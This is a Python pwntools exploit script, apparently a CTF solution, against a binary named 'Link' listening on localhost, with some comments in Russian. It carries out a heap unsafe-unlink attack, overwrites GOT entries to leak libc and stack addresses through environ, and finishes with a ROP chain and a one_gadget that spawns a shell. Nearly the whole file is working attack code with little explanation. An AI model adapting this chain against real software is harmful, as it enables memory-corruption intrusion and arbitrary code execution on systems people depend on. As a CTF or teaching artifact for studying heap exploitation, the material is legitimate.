#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template Link
from pwn import *

# Set up pwntools for the correct architecture
elf = exe = context.binary = ELF(args.EXE or 'Link')
libc = ELF("libc.so.6")
# libc = ELF("/usr/lib/libc.so.6")
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g# .
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# io = start()

io = remote("localhost", 17171)

ptr = 0x424020

print(io.recvuntil(b"statue"))


def add(size, data):
    io.sendline(b"1")
    io.sendlineafter(b"wish?", str(size))    
    io.recvline()
    io.send(data)
    io.recvuntil(b"!\n")


def scan(index, size, data):
    io.sendline(b'2')
    io.sendlineafter(b"change?", str(index))
    io.sendlineafter(b"wish?", str(size))   
    io.send(data)
    io.recvuntil(b"!\n")


def remove(index):
    io.sendline(b"3")
    io.sendline(str(index))
    io.recvuntil(b"!\n")


def view(index):
    io.sendline(b"4")
    io.sendlineafter(b"remember?", str(index))
    io.recvline()
    leak = io.recvline()
    leak = leak.replace(b"\x0a", b"")
    leak = u64(leak + b"\x00"*(8-len(leak)))
    print("leak: ", hex(leak))
    io.recvuntil(b"!\n")
    return leak


for i in range(1, 15):
    add(0xa0, b"\x00"*0xa0)

#заполняем tcache bin, с ним атака не сработает

for i in range(7, 15):
    remove(i)

#эта атака называется unsafe unlink

fake = p64(0x0) 
fake += p64(0xa0) 
fake += p64(ptr - 0x8*3) 
fake += p64(ptr - 0x8*2)
#fake += (p64) * 8
fake += p64(0x0)*((0xa0 - 0x20)//8)

fake += p64(0xa0)
fake += p64(0xb0)
scan(4,0xb0, fake)

remove(5)

scan(4, 0x10, p64(elf.got["fputs"])+ p64(elf.got["malloc"]))
scan(1, 0x8, p64(elf.symbols["puts"]))

mallocLibc = view(2)
libcBase = mallocLibc - libc.symbols["malloc"]

print("libc :", hex(libcBase))

environ = 0x0000000000222200
# environ = 0x00000000001e9d58
#environ итересная штука которая дает там лик стека

scan(4, 0x8, p64(environ + libcBase))

stack = view(1)
print()
hehe = stack - 0x160
# hehe = stack - 0x170

print("target: ", hex(hehe))
scan(4, 0x8, p64(hehe))
view(1)

# for i in range(-0x200, -0x100, 8):
#     print(hex(stack+i))
#     scan(4, 0x8, p64(stack+i))
#     view(1)
# print(hex(hehe))

# Мы используем этот цикл чтобы понять какой адресс сдвига на удаленной машине, так как он может отличаться (-0х160)

pop_rsi = 0x000000000002be51 + libcBase
pop_rdx_rbx = 0x00000000000904a9 + libcBase
# Можно взять из ROPgadget

one_gadget = 0xebc88 + libcBase
# А это уже из one_gadget

payload = p64(pop_rsi) + p64(0) + p64(pop_rdx_rbx) + p64(0) + p64(0) + p64(one_gadget)


io.sendline(b'2')
io.sendlineafter(b"change?", str(1))
io.sendlineafter(b"wish?", str(len(payload)))   
io.send(payload)

io.interactive()
